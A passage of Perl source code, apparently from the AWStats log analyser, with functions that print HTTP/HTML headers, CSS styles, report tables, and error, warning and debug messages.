$ENV{'HTTP_USER_AGENT'} =~ /MSIE|Googlebot/i\n\t\t\t\t? \"Content-type: text/html; charset=$newpagecode\\n\"\n\t\t\t\t: \"Content-type: text/xml; charset=$newpagecode\\n\"\n\t\t\t);\n\t\t}\n\t\telse { print \"Content-type: text/html; charset=$newpagecode\\n\"; }\n\n# Expires must be GMT ANSI asctime and must be after Content-type to avoid pb with some servers (SAMBAR)\n\t\tif ( $Expires =~ /^\\d+$/ ) {\n\t\t\tprint \"Cache-Control: public\\n\";\n\t\t\tprint \"Last-Modified: \" . gmtime($starttime) . \"\\n\";\n\t\t\tprint \"Expires: \" . ( gmtime( $starttime + $Expires ) ) . \"\\n\";\n\t\t}\n\t\tprint \"\\n\";\n\t}\n\t$HeaderHTTPSent++;\n}\n\n#------------------------------------------------------------------------------\n# Function:\t\tWrite on output header of HTML page\n# Parameters:\tNone\n# Input:\t\t%HTMLOutput $PluginMode $Expires $Lang $StyleSheet $HTMLHeadSection $PageCode $PageDir\n# Output:\t\t$HeaderHTMLSent=1\n# Return:\t\tNone\n#------------------------------------------------------------------------------\nsub html_head {\n\tmy $dir = $PageDir ? 'right' : 'left';\n\tif ($NOHTML) { return; }\n\tif ( scalar keys %HTMLOutput || $PluginMode ) {\n\t\tmy $periodtitle = \" ($YearRequired\";\n\t\t$periodtitle .= ( $MonthRequired ne 'all' ? \"-$MonthRequired\" : \"\" );\n\t\t$periodtitle .= ( $DayRequired   ne ''    ? \"-$DayRequired\"   : \"\" );\n\t\t$periodtitle .= ( $HourRequired  ne ''    ? \"-$HourRequired\"  : \"\" );\n\t\t$periodtitle .= \")\";\n\n\t\t# Write head section\n\t\tif ( $BuildReportFormat eq 'xhtml' || $BuildReportFormat eq 'xml' ) {\n\t\t\tif ($PageCode) {\n\t\t\t\tprint \"<?xml version=\\\"1.0\\\" encoding=\\\"$PageCode\\\"?>\\n\";\n\t\t\t}\n\t\t\telse { print \"<?xml version=\\\"1.0\\\" encoding=\\\"iso-8859-1\\\"?>\\n\"; }\n\t\t\tif ( $FrameName ne 'index' ) {\n\t\t\t\tprint\n\"<!DOCTYPE html PUBLIC \\\"-//W3C//DTD XHTML 1.0 Transitional//EN\\\" \\\"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\\\">\\n\";\n\t\t\t}\n\t\t\telse {\n\t\t\t\tprint\n\"<!DOCTYPE html PUBLIC \\\"-//W3C//DTD XHTML 1.0 Frameset//EN\\\" \\\"http://www.w3.org/TR/xhtml1/DTD/xhtml1-frameset.dtd\\\">\\n\";\n\t\t\t}\n\t\t\tprint\n\"<html xmlns=\\\"http://www.w3.org/1999/xhtml\\\" xml:lang=\\\"$Lang\\\">\\n\";\n\t\t}\n\t\telse {\n\t\t\tif ( $FrameName ne 'index' ) {\n\t\t\t\tprint\n\"<!DOCTYPE html PUBLIC \\\"-//W3C//DTD HTML 4.01 Transitional//EN\\\" \\\"http://www.w3.org/TR/html4/loose.dtd\\\">\\n\";\n\t\t\t}\n\t\t\telse {\n\t\t\t\tprint\n\"<!DOCTYPE html PUBLIC \\\"-//W3C//DTD HTML 4.01 Frameset//EN\\\" \\\"http://www.w3.org/TR/html4/frameset.dtd\\\">\\n\";\n\t\t\t}\n\t\t\tprint '<html lang=\"' . $Lang . '\"'\n\t\t\t  . ( $PageDir ? ' dir=\"rtl\"' : '' ) . \">\\n\";\n\t\t}\n\t\tprint \"<head>\\n\";\n\n\t\tmy $endtag = '>';\n\t\tif ( $BuildReportFormat eq 'xhtml' || $BuildReportFormat eq 'xml' ) {\n\t\t\t$endtag = ' />';\n\t\t}\n\n\t\t# Affiche tag meta generator\n\t\tprint\n\"<meta name=\\\"generator\\\" content=\\\"AWStats $VERSION from config file awstats.$SiteConfig.conf (http://www.awstats.org)\\\"$endtag\\n\";\n\n\t\t# Affiche tag meta robots\n\t\tif ($MetaRobot) {\n\t\t\tprint \"<meta name=\\\"robots\\\" content=\\\"\"\n\t\t\t  . ( $FrameName eq 'mainleft' ? 'no' : '' )\n\t\t\t  . \"index,\"\n\t\t\t  . (    $FrameName eq 'mainleft'\n\t\t\t\t  || $FrameName eq 'index' ? '' : 'no' )\n\t\t\t  . \"follow\\\"$endtag\\n\";\n\t\t}\n\t\telse {\n\t\t\tprint \"<meta name=\\\"robots\\\" content=\\\"noindex,nofollow\\\"$endtag\\n\";\n\t\t}\n\n\t\t# Affiche tag meta content-type\n\t\tif ( $BuildReportFormat eq 'xhtml' || $BuildReportFormat eq 'xml' ) {\n\t\t\tprint( $ENV{'HTTP_USER_AGENT'} =~ /MSIE|Googlebot/i\n\t\t\t\t? \"<meta http-equiv=\\\"content-type\\\" content=\\\"text/html; charset=\"\n\t\t\t\t  . ( $PageCode ? $PageCode : \"iso-8859-1\" )\n\t\t\t\t  . \"\\\" />\\n\"\n\t\t\t\t: \"<meta http-equiv=\\\"content-type\\\" content=\\\"text/xml; charset=\"\n\t\t\t\t  . ( $PageCode ? $PageCode : \"iso-8859-1\" )\n\t\t\t\t  . \"\\\"$endtag\\n\"\n\t\t\t);\n\t\t}\n\t\telse {\n\t\t\tprint\n\t\t\t  \"<meta http-equiv=\\\"content-type\\\" content=\\\"text/html; charset=\"\n\t\t\t  . ( $PageCode ? $PageCode : \"iso-8859-1\" )\n\t\t\t  . \"\\\"$endtag\\n\";\n\t\t}\n\n\t\tif ($Expires) {\n\t\t\tprint \"<meta http-equiv=\\\"expires\\\" content=\\\"\"\n\t\t\t  . ( gmtime( $starttime + $Expires ) )\n\t\t\t  . \"\\\"$endtag\\n\";\n\t\t}\n\t\tmy @k = keys\n\t\t  %HTMLOutput;    # This is to have a unique title and description page\n\t\tprint \"<meta http-equiv=\\\"description\\\" content=\\\"\"\n\t\t  . ucfirst($PROG)\n\t\t  . \" - Advanced Web Statistics for $SiteDomain$periodtitle\"\n\t\t  . ( $k[0] ? \" - \" . $k[0] : \"\" )\n\t\t  . \"\\\"$endtag\\n\";\n\t\tif ( $MetaRobot && $FrameName ne 'mainleft' ) {\n\t\t\tprint\n\"<meta http-equiv=\\\"keywords\\\" content=\\\"$SiteDomain, free, advanced, realtime, web, server, logfile, log, analyzer, analysis, statistics, stats, perl, analyse, performance, hits, visits\\\"$endtag\\n\";\n\t\t}\n\t\tprint \"<title>$Message[7] $SiteDomain$periodtitle\"\n\t\t  . ( $k[0] ? \" - \" . $k[0] : \"\" )\n\t\t  . \"</title>\\n\";\n\t\tif ( $FrameName ne 'index' ) {\n\n\t\t\tif ($StyleSheet) {\n\t\t\t\tprint \"<link rel=\\\"stylesheet\\\" href=\\\"$StyleSheet\\\" />\\n\";\n\t\t\t}\n\n# A STYLE section must be in head section. Do not use \" for number in a style section\n\t\t\tprint \"<style type=\\\"text/css\\\">\\n\";\n\n\t\t\tif ( !$StyleSheet ) {\n\t\t\t\tprint\n\"body { font: 11px verdana, arial, helvetica, sans-serif; background-color: #$color_Background; margin-top: 0; margin-bottom: 0; }\\n\";\n\t\t\t\tprint \".aws_bodyl  { }\\n\";\n\t\t\t\tprint\n\".aws_border { border-collapse: collapse; background-color: #$color_TableBG; padding: 1px 1px \"\n\t\t\t\t  . (    $BuildReportFormat eq 'xhtml'\n\t\t\t\t\t  || $BuildReportFormat eq 'xml' ? \"2px\" : \"1px\" )\n\t\t\t\t  . \" 1px; margin-top: 0px; margin-bottom: 0px; }\\n\";\n\t\t\t\tprint\n\".aws_title  { font: 13px verdana, arial, helvetica, sans-serif; font-weight: bold; background-color: #$color_TableBGTitle; text-align: center; margin-top: 0; margin-bottom: 0; padding: 1px 1px 1px 1px; color: #$color_TableTitle; }\\n\";\n\t\t\t\tprint\n\".aws_blank  { font: 13px verdana, arial, helvetica, sans-serif; background-color: #$color_Background; text-align: center; margin-bottom: 0; padding: 1px 1px 1px 1px; }\\n\";\n\t\t\t\tprint <<EOF;\n.aws_data {\n\tbackground-color: #$color_Background;\n\tborder-top-width: 1px;   \n\tborder-left-width: 0px;  \n\tborder-right-width: 0px; \n\tborder-bottom-width: 0px;\n}\n.aws_formfield { font: 13px verdana, arial, helvetica; }\n.aws_button {\n\tfont-family: arial,verdana,helvetica, sans-serif;\n\tfont-size: 12px;\n\tborder: 1px solid #ccd7e0;\n\tbackground-image : url($DirIcons/other/button.gif);\n}\nth\t\t{ border-color: #$color_TableBorder; border-left-width: 0px; border-right-width: 1px; border-top-width: 0px; border-bottom-width: 1px; padding: 1px 2px 1px 1px; font: 11px verdana, arial, helvetica, sans-serif; text-align:center; color: #$color_titletext; }\nth.aws\t{ border-color: #$color_TableBorder; border-left-width: 0px; border-right-width: 1px; border-top-width: 0px; border-bottom-width: 1px; padding: 1px 2px 1px 1px; font-size: 13px; font-weight: bold; }\ntd\t\t{ border-color: #$color_TableBorder; border-left-width: 0px; border-right-width: 1px; border-top-width: 0px; border-bottom-width: 1px; font: 11px verdana, arial, helvetica, sans-serif; text-align:center; color: #$color_text; }\ntd.aws\t{ border-color: #$color_TableBorder; border-left-width: 0px; border-right-width: 1px; border-top-width: 0px; border-bottom-width: 1px; font: 11px verdana, arial, helvetica, sans-serif; text-align:$dir; color: #$color_text; padding: 0px;}\ntd.awsm\t{ border-left-width: 0px; border-right-width: 0px; border-top-width: 0px; border-bottom-width: 0px; font: 11px verdana, arial, helvetica, sans-serif; text-align:$dir; color: #$color_text; padding: 0px; }\nb { font-weight: bold; }\na { font: 11px verdana, arial, helvetica, sans-serif; }\na:link    { color: #$color_link; text-decoration: none; }\na:visited { color: #$color_link; text-decoration: none; }\na:hover   { color: #$color_hover; text-decoration: underline; }\n.currentday { font-weight: bold; }\nEOF\n\t\t\t}\n\n\t\t\t# Call to plugins' function AddHTMLStyles\n\t\t\tforeach my $pluginname ( keys %{ $PluginsLoaded{'AddHTMLStyles'} } )\n\t\t\t{\n\t\t\t\tmy $function = \"AddHTMLStyles_$pluginname\";\n\t\t\t\t&$function();\n\t\t\t}\n\n\t\t\tprint \"</style>\\n\";\n\t\t}\n\n# les scripts necessaires pour trier avec Tablekit\n#\tprint \"<script type=\\\"text\\/javascript\\\" src=\\\"/js/prototype.js\\\"><\\/script>\";\n#\tprint \"<script type=\\\"text\\/javascript\\\" src=\\\"/js/fabtabulous.js\\\"><\\/script>\";\n#\tprint \"<script type=\\\"text\\/javascript\\\" src=\\\"/js/mytablekit.js\\\"><\\/script>\";\n\n\t\t# Call to plugins' function AddHTMLHeader\n\t\tforeach my $pluginname ( keys %{ $PluginsLoaded{'AddHTMLHeader'} } )\n\t\t{\n\t\t\tmy $function = \"AddHTMLHeader_$pluginname\";\n\t\t\t&$function();\n\t\t}\n\t\t\t\n\t\tprint \"</head>\\n\\n\";\n\t\tif ( $FrameName ne 'index' ) {\n\t\t\tprint \"<body style=\\\"margin-top: 0px\\\"\";\n\t\t\tif ( $FrameName eq 'mainleft' ) { print \" class=\\\"aws_bodyl\\\"\"; }\n\t\t\tprint \">\\n\";\n\t\t}\n\t}\n\t$HeaderHTMLSent++;\n}\n\n#------------------------------------------------------------------------------\n# Function:\t\tWrite on output end of HTML page\n# Parameters:\t0|1 (0=no list plugins,1=list plugins)\n# Input:\t\t%HTMLOutput $HTMLEndSection $FrameName $BuildReportFormat\n# Output:\t\tNone\n# Return:\t\tNone\n#------------------------------------------------------------------------------\nsub html_end {\n\tmy $listplugins = shift || 0;\n\tif ( scalar keys %HTMLOutput ) {\n\n\t\t# Call to plugins' function AddHTMLBodyFooter\n\t\tforeach my $pluginname ( keys %{ $PluginsLoaded{'AddHTMLBodyFooter'} } )\n\t\t{\n\n\t\t\t# my $function=\"AddHTMLBodyFooter_$pluginname()\";\n\t\t\t# eval(\"$function\");\n\t\t\tmy $function = \"AddHTMLBodyFooter_$pluginname\";\n\t\t\t&$function();\n\t\t}\n\n\t\tif ( $FrameName ne 'index' && $FrameName ne 'mainleft' ) {\n\t\t\tprint \"$Center<br /><br />\\n\";\n\t\t\tprint\n\"<span dir=\\\"ltr\\\" style=\\\"font: 11px verdana, arial, helvetica; color: #$color_text;\\\">\";\n\t\t\tprint\n\"<b>Advanced Web Statistics $VERSION</b> - <a href=\\\"http://www.awstats.org\\\" target=\\\"awstatshome\\\">\";\n\t\t\tprint $Message[169] . \" $PROG\";\n\t\t\tif ($listplugins) {\n\t\t\t\tmy $atleastoneplugin = 0;\n\t\t\t\tforeach my $pluginname ( keys %{ $PluginsLoaded{'init'} } ) {\n\t\t\t\t\tif ( !$atleastoneplugin ) {\n\t\t\t\t\t\t$atleastoneplugin = 1;\n\t\t\t\t\t\tprint \" ($Message[170]: \";\n\t\t\t\t\t}\n\t\t\t\t\telse { print \", \"; }\n\t\t\t\t\tprint \"$pluginname\";\n\t\t\t\t}\n\t\t\t\tif ($atleastoneplugin) { print \")\"; }\n\t\t\t}\n\t\t\tprint \"</a></span><br />\\n\";\n\t\t\tif ($HTMLEndSection) { print \"<br />\\n$HTMLEndSection\\n\"; }\n\t\t}\n\t\tprint \"\\n\";\n\t\tif ( $FrameName ne 'index' ) {\n\t\t\tif ( $FrameName ne 'mainleft' && $BuildReportFormat eq 'html' ) {\n\t\t\t\tprint \"<br />\\n\";\n\t\t\t}\n\t\t\tprint \"</body>\\n\";\n\t\t}\n\t\tprint \"</html>\\n\";\n\n\t\t#\t\tprint \"<!-- NEW PAGE --><!-- NEW SHEET -->\\n\";\n\t}\n}\n\n#------------------------------------------------------------------------------\n# Function:\t\tPrint on stdout tab header of a chart\n# Parameters:\t$title $tooltipnb [$width percentage of chart title]\n# Input:\t\tNone\n# Output:\t\tNone\n# Return:\t\tNone\n#------------------------------------------------------------------------------\nsub tab_head {\n\tmy $title     = shift;\n\tmy $tooltipnb = shift;\n\tmy $width     = shift || 70;\n\tmy $class     = shift;\n\n\t# Call to plugins' function TabHeadHTML\n\tmy $extra_head_html = '';\n\tforeach my $pluginname ( keys %{ $PluginsLoaded{'TabHeadHTML'} } ) {\n\t\tmy $function = \"TabHeadHTML_$pluginname\";\n\t\t$extra_head_html .= &$function($title);\n\t}\n\n\tif ( $width == 70 && $QueryString =~ /buildpdf/i ) {\n\t\tprint\n\"<table class=\\\"aws_border sortable\\\" border=\\\"0\\\" cellpadding=\\\"2\\\" cellspacing=\\\"0\\\" width=\\\"800\\\">\\n\";\n\t}\n\telse {\n\t\tprint\n\"<table class=\\\"aws_border sortable\\\" border=\\\"0\\\" cellpadding=\\\"2\\\" cellspacing=\\\"0\\\" width=\\\"100%\\\">\\n\";\n\t}\n\n\tif ($tooltipnb) {\n\t\tprint \"<tr><td class=\\\"aws_title\\\" width=\\\"$width%\\\"\"\n\t\t  . Tooltip( $tooltipnb, $tooltipnb )\n\t\t  . \">$title \"\n\t\t  . $extra_head_html . \"</td>\";\n\t}\n\telse {\n\t\tprint \"<tr><td class=\\\"aws_title\\\" width=\\\"$width%\\\">$title \"\n\t\t  . $extra_head_html . \"</td>\";\n\t}\n\tprint \"<td class=\\\"aws_blank\\\">&nbsp;</td></tr>\\n\";\n\tprint \"<tr><td colspan=\\\"2\\\">\\n\";\n\tif ( $width == 70 && $QueryString =~ /buildpdf/i ) {\n\t\tprint\n\"<table class=\\\"aws_data\\\" border=\\\"1\\\" cellpadding=\\\"2\\\" cellspacing=\\\"0\\\" width=\\\"796\\\">\\n\";\n\t}\n\telse {\n\t\tprint\n\"<table class=\\\"aws_data\\\" border=\\\"1\\\" cellpadding=\\\"2\\\" cellspacing=\\\"0\\\" width=\\\"100%\\\">\\n\";\n\t}\n}\n\n#------------------------------------------------------------------------------\n# Function:\t\tPrint on stdout tab ender of a chart\n# Parameters:\tNone\n# Input:\t\tNone\n# Output:\t\tNone\n# Return:\t\tNone\n#------------------------------------------------------------------------------\nsub tab_end {\n\tmy $string = shift;\n\tprint \"</table></td></tr></table>\";\n\tif ($string) {\n\t\tprint\n\"<span style=\\\"font: 11px verdana, arial, helvetica;\\\">$string</span><br />\\n\";\n\t}\n\tprint \"<br />\\n\\n\";\n}\n\n#------------------------------------------------------------------------------\n# Function:\t\tWrite error message and exit\n# Parameters:\t$message $secondmessage $thirdmessage $donotshowsetupinfo\n# Input:\t\t$HeaderHTTPSent $HeaderHTMLSent %HTMLOutput $LogSeparator $LogFormat\n# Output:\t\tNone\n# Return:\t\tNone\n#------------------------------------------------------------------------------\nsub error {\n\tmy $message = shift || '';\n\tif ( scalar keys %HTMLOutput ) {\n\t\t$message =~ s/\\</&lt;/g;\n\t\t$message =~ s/\\>/&gt;/g;\n\t}\n\tmy $secondmessage      = shift || '';\n\tmy $thirdmessage       = shift || '';\n\tmy $donotshowsetupinfo = shift || 0;\n\n\tif ( !$HeaderHTTPSent && $ENV{'GATEWAY_INTERFACE'} ) { http_head(); }\n\tif ( !$HeaderHTMLSent && scalar keys %HTMLOutput )   {\n\t\tprint \"<html><body>\\n\";\n\t\t$HeaderHTMLSent = 1;\n\t}\n\tif ($Debug) { debug( \"$message $secondmessage $thirdmessage\", 1 ); }\n\tmy $tagbold     = '';\n\tmy $tagunbold   = '';\n\tmy $tagbr       = '';\n\tmy $tagfontred  = '';\n\tmy $tagfontgrey = '';\n\tmy $tagunfont   = '';\n\tif ( scalar keys %HTMLOutput ) {\n\t\t$tagbold     = '<b>';\n\t\t$tagunbold   = '</b>';\n\t\t$tagbr       = '<br />';\n\t\t$tagfontred  = '<span style=\"color: #880000\">';\n\t\t$tagfontgrey = '<span style=\"color: #888888\">';\n\t\t$tagunfont   = '</span>';\n\t}\n\tif ( !$ErrorMessages && $message =~ /^Format error$/i ) {\n\n\t\t# Files seems to have bad format\n\t\tif ( scalar keys %HTMLOutput )   { print \"<br /><br />\\n\"; }\n\t\tif ( $message !~ $LogSeparator ) {\n\n\t\t\t# Bad LogSeparator parameter\n\t\t\tprint\n\"${tagfontred}AWStats did not found the ${tagbold}LogSeparator${tagunbold} in your log records.${tagbr}${tagunfont}\\n\";\n\t\t}\n\t\telse {\n\n\t\t\t# Bad LogFormat parameter\n\t\t\tprint\n\"AWStats did not find any valid log lines that match your ${tagbold}LogFormat${tagunbold} parameter, in the ${NbOfLinesForCorruptedLog}th first non commented lines read of your log.${tagbr}\\n\";\n\t\t\tprint\n\"${tagfontred}Your log file ${tagbold}$thirdmessage${tagunbold} must have a bad format or ${tagbold}LogFormat${tagunbold} parameter setup does not match this format.${tagbr}${tagbr}${tagunfont}\\n\";\n\t\t\tprint\n\t\t\t  \"Your AWStats ${tagbold}LogFormat${tagunbold} parameter is:\\n\";\n\t\t\tprint \"${tagbold}$LogFormat${tagunbold}${tagbr}\\n\";\n\t\t\tprint\n\t\t\t  \"This means each line in your web server log file need to have \";\n\t\t\tif ( $LogFormat == 1 ) {\n\t\t\t\tprint\n\"${tagbold}\\\"combined log format\\\"${tagunbold} like this:${tagbr}\\n\";\n\t\t\t\tprint( scalar keys %HTMLOutput ? \"$tagfontgrey<i>\" : \"\" );\n\t\t\t\tprint\n\"111.22.33.44 - - [10/Jan/2001:02:14:14 +0200] \\\"GET / HTTP/1.1\\\" 200 1234 \\\"http://www.fromserver.com/from.htm\\\" \\\"Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)\\\"\\n\";\n\t\t\t\tprint(\n\t\t\t\t\tscalar keys %HTMLOutput\n\t\t\t\t\t? \"</i>$tagunfont${tagbr}${tagbr}\\n\"\n\t\t\t\t\t: \"\"\n\t\t\t\t);\n\t\t\t}\n\t\t\tif ( $LogFormat == 2 ) {\n\t\t\t\tprint\n\"${tagbold}\\\"MSIE Extended W3C log format\\\"${tagunbold} like this:${tagbr}\\n\";\n\t\t\t\tprint( scalar keys %HTMLOutput ? \"$tagfontgrey<i>\" : \"\" );\n\t\t\t\tprint\n\"date time c-ip c-username cs-method cs-uri-sterm sc-status sc-bytes cs-version cs(User-Agent) cs(Referer)\\n\";\n\t\t\t\tprint(\n\t\t\t\t\tscalar keys %HTMLOutput\n\t\t\t\t\t? \"</i>$tagunfont${tagbr}${tagbr}\\n\"\n\t\t\t\t\t: \"\"\n\t\t\t\t);\n\t\t\t}\n\t\t\tif ( $LogFormat == 3 ) {\n\t\t\t\tprint\n\"${tagbold}\\\"WebStar native log format\\\"${tagunbold}${tagbr}\\n\";\n\t\t\t}\n\t\t\tif ( $LogFormat == 4 ) {\n\t\t\t\tprint\n\"${tagbold}\\\"common log format\\\"${tagunbold} like this:${tagbr}\\n\";\n\t\t\t\tprint( scalar keys %HTMLOutput ? \"$tagfontgrey<i><pre>\" : \"\" );\n\t\t\t\tprint\n\"111.22.33.44 - - [10/Jan/2001:02:14:14 +0200] \\\"GET / HTTP/1.1\\\" 200 1234\\n\";\n\t\t\t\tprint(\n\t\t\t\t\tscalar keys %HTMLOutput\n\t\t\t\t\t? \"</pre></i>$tagunfont${tagbr}${tagbr}\\n\"\n\t\t\t\t\t: \"\"\n\t\t\t\t);\n\t\t\t}\n\t\t\tif ( $LogFormat == 6 ) {\n\t\t\t\tprint\n\"${tagbold}\\\"Lotus Notes/Lotus Domino\\\"${tagunbold}${tagbr}\\n\";\n\t\t\t\tprint( scalar keys %HTMLOutput ? \"$tagfontgrey<i>\" : \"\" );\n\t\t\t\tprint\n\"111.22.33.44 - Firstname Middlename Lastname [10/Jan/2001:02:14:14 +0200] \\\"GET / HTTP/1.1\\\" 200 1234 \\\"http://www.fromserver.com/from.htm\\\" \\\"Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)\\\"\\n\";\n\t\t\t\tprint(\n\t\t\t\t\tscalar keys %HTMLOutput\n\t\t\t\t\t? \"</i></span>${tagbr}${tagbr}\\n\"\n\t\t\t\t\t: \"\"\n\t\t\t\t);\n\t\t\t}\n\t\t\tif ( $LogFormat !~ /^[1-6]$/ ) {\n\t\t\t\tprint \"the following personalized log format:${tagbr}\\n\";\n\t\t\t\tprint( scalar keys %HTMLOutput ? \"$tagfontgrey<i>\" : \"\" );\n\t\t\t\tprint \"$LogFormat\\n\";\n\t\t\t\tprint(\n\t\t\t\t\tscalar keys %HTMLOutput\n\t\t\t\t\t? \"</i>$tagunfont${tagbr}${tagbr}\\n\"\n\t\t\t\t\t: \"\"\n\t\t\t\t);\n\t\t\t}\n\t\t\tprint\n\"And this is an example of records AWStats found in your log file (the record number $NbOfLinesForCorruptedLog in your log):\\n\";\n\t\t\tprint( scalar keys %HTMLOutput ? \"<br />$tagfontgrey<i>\" : \"\" );\n\t\t\tprint \"$secondmessage\";\n\t\t\tprint(\n\t\t\t\tscalar keys %HTMLOutput\n\t\t\t\t? \"</i>$tagunfont${tagbr}${tagbr}\"\n\t\t\t\t: \"\"\n\t\t\t);\n\t\t\tprint \"\\n\";\n\t\t}\n\n#print \"Note: If your $NbOfLinesForCorruptedLog first lines in your log files are wrong because of \";\n#print \"a worm virus attack, you can increase the NbOfLinesForCorruptedLog parameter in config file.\\n\";\n#print \"\\n\";\n\t}\n\telse {\n\t\tprint( scalar keys %HTMLOutput ? \"<br />$tagfontred\\n\" : \"\" );\n\t\tprint( $ErrorMessages? \"$ErrorMessages\" : \"Error: $message\" );\n\t\tprint( scalar keys %HTMLOutput ? \"\\n</span><br />\" : \"\" );\n\t\tprint \"\\n\";\n\t}\n\tif ( !$ErrorMessages && !$donotshowsetupinfo ) {\n\t\tif ( $message =~ /Couldn.t open config file/i ) {\n\t\t\tmy $dir = $DIR;\n\t\t\tif ( $dir =~ /^\\./ ) { $dir .= '/../..'; }\n\t\t\telse { $dir =~ s/[\\\\\\/]?wwwroot[\\/\\\\]cgi-bin[\\\\\\/]?//; }\n\t\t\tprint \"${tagbr}\\n\";\n\t\t\tif ( $ENV{'GATEWAY_INTERFACE'} ) {\n\t\t\t\tprint\n\"- ${tagbold}Did you use the correct URL ?${tagunbold}${tagbr}\\n\";\n\t\t\t\tprint\n\"Example: http://localhost/awstats/awstats.pl?config=mysite${tagbr}\\n\";\n\t\t\t\tprint\n\"Example: http://127.0.0.1/cgi-bin/awstats.pl?config=mysite${tagbr}\\n\";\n\t\t\t}\n\t\t\telse {\n\t\t\t\tprint\n\"- ${tagbold}Did you use correct config parameter ?${tagunbold}${tagbr}\\n\";\n\t\t\t\tprint\n\"Example: If your config file is awstats.mysite.conf, use -config=mysite\\n\";\n\t\t\t}\n\t\t\tprint\n\"- ${tagbold}Did you create your config file 'awstats.$SiteConfig.conf' ?${tagunbold}${tagbr}\\n\";\n\t\t\tprint\n\"If not, you can run \\\"awstats_configure.pl\\\"\\nfrom command line, or create it manually.${tagbr}\\n\";\n\t\t\tprint \"${tagbr}\\n\";\n\t\t}\n\t\telse {\n\t\t\tprint \"${tagbr}${tagbold}Setup (\"\n\t\t\t  . ( $FileConfig ? \"'\" . $FileConfig . \"'\" : \"Config\" )\n\t\t\t  . \" file, web server or permissions) may be wrong.${tagunbold}${tagbr}\\n\";\n\t\t}\n\t\tprint\n\"Check config file, permissions and AWStats documentation (in 'docs' directory).\\n\";\n\t}\n\n\t# Remove lock if not a lock message\n\tif ( $EnableLockForUpdate && $message !~ /lock file/ ) { &Lock_Update(0); }\n\tif ( scalar keys %HTMLOutput ) { print \"</body></html>\\n\"; }\n\texit 1;\n}\n\n#------------------------------------------------------------------------------\n# Function:\t\tWrite a warning message\n# Parameters:\t$message\n# Input:\t\t$HeaderHTTPSent $HeaderHTMLSent $WarningMessage %HTMLOutput\n# Output:\t\tNone\n# Return:\t\tNone\n#------------------------------------------------------------------------------\nsub warning {\n\tmy $messagestring = shift;\n\n\tif ($Debug) { debug( \"$messagestring\", 1 ); }\n\tif ($WarningMessages) {\n\t\tif ( !$HeaderHTTPSent && $ENV{'GATEWAY_INTERFACE'} ) { http_head(); }\n\t\tif ( !$HeaderHTMLSent )        { html_head(); }\n\t\tif ( scalar keys %HTMLOutput ) {\n\t\t\t$messagestring =~ s/\\n/\\<br\\>/g;\n\t\t\tprint \"$messagestring<br />\\n\";\n\t\t}\n\t\telse {\n\t\t\tprint \"$messagestring\\n\";\n\t\t}\n\t}\n}\n\n#------------------------------------------------------------------------------\n# Function:     Write debug message and exit\n# Parameters:   $string $level\n# Input:        %HTMLOutput  $Debug=required level  $DEBUGFORCED=required level forced\n# Output:\t\tNone\n# Return:\t\tNone\n#------------------------------------------------------------------------------\nsub debug {\n\tmy $level = $_[1] || 1;\n\n\tif ( !$HeaderHTTPSent && $ENV{'GATEWAY_INTERFACE'} ) {\n\t\thttp_head();\n\t}    # To send the HTTP header and see debug\n\tif ( $level <= $DEBUGFORCED ) {\n\t\tmy $debugstring = $_[0];\n\t\tif ( !$DebugResetDone ) {\n\t\t\topen( DEBUGFORCEDFILE, \"<debug.log\" );\n\t\t\tclose DEBUGFORCEDFILE;\n\t\t\tchmod 0666, \"debug.log\";\n\t\t\t$DebugResetDone = 1;\n\t\t}\n\t\topen( DEBUGFORCEDFILE, \">>debug.log\" );\n\t\tprint DEBUGFORCEDFILE localtime(time)\n\t\t  . \" - $$ - DEBUG $level - $debugstring\\n\";\n\t\tclose DEBUGFORCEDFILE;\n\t}\n\tif ( $DebugMessages && $level <= $Debug ) {\n\t\tmy $debugstring = $_[0];\n\t\tif ( scalar keys %HTMLOutput ) {\n\t\t\t$debugstring =~ s/^ /&nbsp;&nbsp; /;\n\t\t\t$debugstring .= \"<br />\";\n\t\t}\n\t\tprint localtime(time) . \" - DEBUG $level - $debugstring\\n\";\n\t}\n}\n\n#------------------------------------------------------------------------------\n# Function:     Optimize an array of precompiled regex by removing duplicate entries\n# Parameters:\t@Array notcasesensitive=0|1\n# Input:        None\n# Output:\t\tNone\n# Return:\t\tNone\n#------------------------------------------------------------------------------\nsub OptimizeArray {\n\tmy $array = shift;\n\tmy @arrayunreg = map { UnCompileRegex($_) } @$array;\n\tmy $notcasesensitive = shift;\n\tmy $searchlist       = 0;\n\tif ($Debug) {\n\t\tdebug( \"OptimizeArray (notcasesensitive=$notcasesensitive)\", 4 );\n\t}\n\twhile ( $searchlist > -1 && @arrayunreg ) {\n\t\tmy $elemtoremove = -1;\n\t  OPTIMIZELOOP:\n\t\tforeach my $i ( $searchlist .. ( scalar @arrayunreg ) - 1 ) {\n\n\t\t\t# Search if $i elem is already treated by another elem\n\t\t\tforeach my $j ( 0 .. ( scalar @arrayunreg ) - 1 ) {\n\t\t\t\tif ( $i == $j ) { next; }\n\t\t\t\tmy $parami =\n\t\t\t\t  $notcasesensitive ? lc( $arrayunreg[$i] ) : $arrayunreg[$i];\n\t\t\t\tmy $paramj =\n\t\t\t\t  $notcasesensitive ? lc( $arrayunreg[$j] ) : $arrayunreg[$j];\n\t\t\t\tif ($Debug) {\n\t\t\t\t\tdebug( \" Compare $i ($parami) to $j ($paramj)\", 4 );\n\t\t\t\t}\n\t\t\t\tif ( index( $parami, $paramj ) > -1 ) {\n\t\t\t\t\tif ($Debug) {\n\t\t\t\t\t\tdebug(\n\" Elem $i ($arrayunreg[$i]) already treated with elem $j ($arrayunreg[$j])\",\n\t\t\t\t\t\t\t4\n\t\t\t\t\t\t);\n\t\t\t\t\t}\n\t\t\t\t\t$elemtoremove = $i;\n\t\t\t\t\tlast OPTIMIZELOOP;\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t\tif ( $elemtoremove > -1 ) {\n\t\t\tif ($Debug) {\n\t\t\t\tdebug(\n\t\t\t\t\t\" Remove elem $elemtoremove - $arrayunreg[$elemtoremove]\",\n\t\t\t\t\t4 );\n\t\t\t}\n\t\t\tsplice @arrayunreg, $elemtoremove, 1;\n\t\t\t$searchlist = $elemtoremove;\n\t\t}\n\t\telse {\n\t\t\t$searchlist = -1;\n\t\t}\n\t}\n\tif ($notcasesensitive) {\n\t\treturn map { qr/$_/i } @arrayunreg;\n\t}\n\treturn map { qr/$_/ } @arrayunreg;\n}\n\n#------------------------------------------------------------------------------\n# Function:     Check if parameter is in SkipDNSLookupFor 